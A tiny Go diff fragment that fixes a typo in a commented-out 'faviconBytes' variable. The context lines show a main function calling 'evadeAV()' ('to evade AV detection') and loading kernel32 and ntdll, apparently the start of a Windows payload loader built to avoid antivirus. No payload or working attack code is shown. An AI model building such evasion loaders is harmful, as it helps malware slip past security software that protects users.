@@ -145,7 +145,7 @@ func main() {
 	// Call the evadeAV function to evade AV detection
 	evadeAV()
 
-	//var faciconBytes []byte
+	//var faviconBytes []byte
 
 	// Instantiate the kernel32 and ntdll DLLs
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
